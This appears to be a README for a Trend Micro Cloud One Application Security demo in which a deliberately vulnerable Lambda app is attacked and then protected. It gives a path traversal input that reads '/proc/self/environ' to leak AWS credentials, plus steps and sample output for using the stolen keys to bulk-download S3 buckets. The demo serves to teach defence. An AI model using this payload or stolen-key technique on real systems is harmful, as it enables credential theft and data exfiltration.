# Cloud One Application Security - Severless demo

A demonstration of how Trend Micro's "Cloud One: Application Security" product can be used to protect serverless applications.

More information can be found [here](https://www.trendmicro.com/en_au/business/products/hybrid-cloud/cloud-one-workload-security.html), as well as in the [docs.](https://cloudone.trendmicro.com/docs/application-security/introduction/#)

## Deployment
### Lambda layer

1. Create an Application Security Lambda Layer:
    
   ```
    mkdir /tmp/python
    cd /tmp/python
    pip3 install --target=/tmp/python trend-app-protect
    cd ..
    zip -r trend.zip python
    aws lambda publish-layer-version \
        --layer-name app-protect \
        --description "App Protect" \
        --zip-file fileb://trend.zip \
        --compatible-runtimes python3.7
    ```

### Deploy app
 
1. Obtain the Layer ARN.
2. Create the CloudFormation stack:
 
     ```
    aws cloudformation create-stack \
    --stack-name ApplicationSecurityDemo \
    --template-body file://cfn.yaml \
    --parameters ParameterKey=ApplicationSecurityLayerArn,ParameterValue=<LAYER_ARN> \
    --capabilities CAPABILITY_IAM
    ```

## Attack the unprotected app

1. Obtain the app's URL:

    ```
    aws cloudformation describe-stacks --stack-name ApplicationSecurityDemo --query "Stacks[0].Outputs[?OutputKey=='AppUrl'].OutputValue" --output text    
    ```

2. Enter the following string into the form:

    ```
   ../../proc/self/environ
    ```
   
Among other things, the following values are shown:

* AWS_ACCESS_KEY_ID
* AWS_SECRET_ACCESS_KEY
* AWS_SESSION_TOKEN

These keys can be used by an attacker to access and control your AWS account. See the **"Exploitation Demo"** below for more information. 

## Protecting the app

1. Log into [Application Security.](https://dashboard.app-protect.trendmicro.com/)
2. Create a new "Group".
3. Set "Illegal File Access" to "**Mitigate**". 
4. Obtain the `Key` and `Secret` credentials.
5. Use these credentials to set the Lambda's `TREND_AP_KEY` and `TREND_AP_SECRET` API keys.
6. Try exploiting the app again:

    ```
   ../../proc/self/environ
    ```

## Exploitation Demo

In this section of the documentation we'll cover how the aforementioned keys can be used for nefarious purposes.

For the purposes of this demo, let's pretend the Lambda required S3 bucket access.  

1. Add the following policy to the Lambda's role:

    ```
    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "VisualEditor0",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:ListAllMyBuckets",
                    "s3:ListBucket"
                ],
                "Resource": "*"
            }
        ]
    }
    ```

    **Note:** The above policy gives the script read access to **all buckets**. If you'd like to specify a specific bucket ARN, please do so.

2. Take the "stolen" keys and set them as environment variables:

    ```
    export AWS_ACCESS_KEY=<ACCESS_KEY>
    export AWS_SECRET_KEY=<SECRET_KEY>
    export AWS_SESSION_TOKEN=<SESSION_TOKEN> 
    ```

    Optional: Specify where you want the downloaded objects to be stored on your system:

    ```
    export BASE_DEST_DIR=<DIR_PATH> # defaults to /tmp/<bucket_name>
    ```

3. Navigate to the `code` directory. Execute the `attack_script.py` script with the name of a bucket or the `all` keyword.

    **Note:** Use caution when specifying the `all` keyword. It will cause the script to download all objects from all S3 buckets. 

### Example runs

Executing the script with the `super-secret-bucket-2812093901231` bucket name specified:

```
python3 attack_script.py super-secret-bucket-2812093901231
Checking if super-secret-bucket-2812093901231 exists...
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-1-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-2-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-3-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-4-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-5-data.txt

====================================================================================================
Successfully downloaded 5 files
```

Executing the script with the `all` keyword specified:

```
attack_script.py all
Found bucket: super-secret-bucket-2812093901231
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-1-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-2-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-3-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-4-data.txt
Downloading: /tmp/super-secret-bucket-2812093901231/data/user-5-data.txt

Found bucket: trendcontainerdemo-cicd-artifact-vhjlbmrdb250ywluzxjezw1vlunjq0
Downloading: /tmp/trendcontainerdemo-cicd-artifact-vhjlbmrdb250ywluzxjezw1vlunjq0/Trend-Container-Imag/AppCode/P38kz5n
Downloading: /tmp/trendcontainerdemo-cicd-artifact-vhjlbmrdb250ywluzxjezw1vlunjq0/Trend-Container-Imag/AppCode/bLjODwJ

====================================================================================================
Successfully downloaded 7 files
```
   
# Contact

* Blog: [oznetnerd.com](https://oznetnerd.com)
* Email: [will@oznetnerd.com](mailto:will@oznetnerd.com)
